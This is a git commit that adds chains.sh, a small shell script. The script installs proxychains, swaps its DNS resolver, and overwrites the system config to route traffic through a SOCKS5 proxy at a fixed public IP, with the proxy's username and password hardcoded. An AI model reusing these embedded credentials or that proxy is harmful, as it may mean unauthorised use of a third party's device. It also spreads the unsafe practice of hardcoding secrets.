7d9d9f8037065518c948745688e25d8938060205
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2020-12-10 21:31:26 +0200

    Create chains.sh

---
+++ chains.sh
@@ -0,0 +1,12 @@
+#!/bin/sh
+apt update;apt -y install proxychains;
+sed -i 's/DNS_SERVER=${PROXYRESOLV_DNS:-4.2.2.2}/DNS_SERVER=${PROXYRESOLV_DNS:-8.8.8.8}/' /usr/lib/proxychains3/proxyresolv
+rm /etc/proxychains.conf
+echo 'strict_chain
+proxy_dns
+tcp_read_time_out 15000
+tcp_connect_time_out 8000
+[ProxyList]
+socks5 165.165.131.175 1080 mikrotik999 Elibawnos
+' > /etc/proxychains.conf
+exit 0
